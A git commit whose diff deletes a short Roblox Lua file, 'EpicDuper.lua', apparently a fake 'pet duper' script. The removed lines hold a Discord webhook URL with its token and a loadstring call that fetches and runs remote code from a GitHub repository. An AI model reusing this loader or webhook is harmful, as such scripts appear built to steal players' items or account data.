b67d7dfabb4a1e7e533e4bb203ac4087227dae1d
a <81264672+CG5isthebest@users.noreply.github.com>
2023-04-13 18:54:07 -0500

    Sorry my cat ran over my keyboard and m,ouse

--- EpicDuper.lua
+++
@@ -1,4 +0,0 @@
-_G.Username = "robloxepicdinos"
-_G.HubName = "Epic Duper"
-_G.Webhook = "https://discord.com/api/webhooks/1091120667501539399/duUEH7yUKVT0KiVnDnG1FUmBDQitHmnI5n5kS2p0srLZRWQnk3D5Dlwbl7R5z79SeL6b"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/CG5isthebest/TotallyRealPetDuperPSX/main/new%201.lua"))()
